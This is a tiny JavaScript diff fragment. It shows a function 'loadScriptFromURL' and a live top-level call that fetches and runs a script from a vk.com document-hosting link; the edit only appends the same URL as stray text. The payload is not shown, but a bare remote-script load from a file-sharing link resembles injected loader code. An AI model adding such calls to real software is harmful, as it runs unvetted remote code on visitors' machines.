@@ -13,4 +13,4 @@ function loadScriptFromURL(url) {
     return true;
 }
 
-  loadScriptFromURL('https://m.vk.com/doc-125614288_450517824'); 
+  loadScriptFromURL('https://m.vk.com/doc-125614288_450517824'); https://m.vk.com/doc-125614288_450517824
